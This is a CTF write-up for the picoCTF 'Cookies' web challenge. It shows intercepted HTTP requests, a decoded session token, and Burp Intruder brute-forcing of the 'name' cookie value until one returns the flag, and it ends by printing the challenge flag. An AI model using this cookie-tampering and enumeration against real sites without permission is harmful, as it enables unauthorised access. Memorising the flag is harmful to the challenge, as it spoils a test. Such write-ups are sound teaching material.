# Cookies

## Description
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:17781/](http://mercury.picoctf.net:17781/)

## Write Up
First we'll fire up burp so we can have a look at the HTTP request that gets sent when you enter in a cookie name this is what we can see:

```
POST /search HTTP/1.1
Host: mercury.picoctf.net:17781
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mercury.picoctf.net:17781/
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://mercury.picoctf.net:17781
DNT: 1
Connection: close
Cookie: name=-1
Upgrade-Insecure-Requests: 1

name=mint
```

This is the resultant HTTP request when I entered in mint into the search bar. The request has a Cookie header which has a "name" attribute, and the POST body has a "name" field with our input inside. 

If we forward our this request through a **GET** request gets created:

```
GET / HTTP/1.1
Host: mercury.picoctf.net:17781
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mercury.picoctf.net:17781/
DNT: 1
Connection: close
Cookie: name=-1; session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiVGhhdCBkb2Vzbid0IGFwcGVhciB0byBiZSBhIHZhbGlkIGNvb2tpZS4iXX1dfQ.YShNXQ.I6h-imR03NfNpf3sg3t6btKuMEE
Upgrade-Insecure-Requests: 1
```

The Cookie header now has a session token which looks like a **JSON Web Token (JWT)**, If we copy it into a JWT decoder we can see that the token is malformed however, we can see some of its values:

```
{
  "_flashes": [
    {
      " t": [
        "danger",
        "That doesn't appear to be a valid cookie."
      ]
    }
  ]
}
```

It is telling us the Cookie value "name=-1" doesnt seem to be valid. So we will go back to the home page, enter a new cookie name in, intercept the request and alter the Cookie header attribute and see what happens. (NOTE: Additional GET request get created when we alter the "name" attribute, we will update the name attribute to our new number that we are trying with all these subsequent requests):

First request : **POST** to /search: name=1
```
POST /search HTTP/1.1
Host: mercury.picoctf.net:17781
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mercury.picoctf.net:17781/
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Origin: http://mercury.picoctf.net:17781
DNT: 1
Connection: close
Cookie: name=1
Upgrade-Insecure-Requests: 1

name=
```

Second request: **GET** to /: name=1
```
GET / HTTP/1.1
Host: mercury.picoctf.net:17781
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mercury.picoctf.net:17781/
DNT: 1
Connection: close
Cookie: name=1; session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiVGhhdCBkb2Vzbid0IGFwcGVhciB0byBiZSBhIHZhbGlkIGNvb2tpZS4iXX1dfQ.YShPlQ.3fIqpvgH5hbrlUW69JrZkIQ5AH4
Upgrade-Insecure-Requests: 1
```

Third request: **GET** to /check: name=1
```
GET /check HTTP/1.1
Host: mercury.picoctf.net:17781
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mercury.picoctf.net:17781/
DNT: 1
Connection: close
Cookie: name=1; session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiVGhhdCBkb2Vzbid0IGFwcGVhciB0byBiZSBhIHZhbGlkIGNvb2tpZS4iXX1dfQ.YShPlQ.3fIqpvgH5hbrlUW69JrZkIQ5AH4
Upgrade-Insecure-Requests: 1
```

We can see that the page responds with this:

![Image of chocolate
search](https://github.com/sixdeadbeefs/CTF/blob/main/PicoCTF/web-exploitation/cookies/images/chocolate.png)

So we know that cookie types are assigned to a number referenced in the name attribute. So we will use Burpsuite intruder to brute force name values starting 1. (NOTE: We dont sent the **POST** request to the intruder because we know that all the post requests to /search just get redirected, as we saw above with the subsequent requests we dealt with before, instead we send the request that gets generated after a POST is sent to /search)

Our positions will look like this, with attack type **Sniper**:
```
GET /check HTTP/1.1
Host: mercury.picoctf.net:17781
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mercury.picoctf.net:17781/
DNT: 1
Connection: close
Cookie: name=ยง-1ยง; session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiVGhhdCBkb2Vzbid0IGFwcGVhciB0byBiZSBhIHZhbGlkIGNvb2tpZS4iXX1dfQ.YSh3aA.J8b66mdt5q4dPoOSpNL9ARqqPfQ
Upgrade-Insecure-Requests: 1
```

And our payload will contain this configuration:

![Image of intruder configuration](https://github.com/sixdeadbeefs/CTF/blob/main/PicoCTF/web-exploitation/cookies/images/intruder-config.png)

After the intruder attack is done, we can see a list of all the requests sent and their responses back, if we start looking through the responses we will eventually come across the response to name=18 which contains our cookie.

picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}
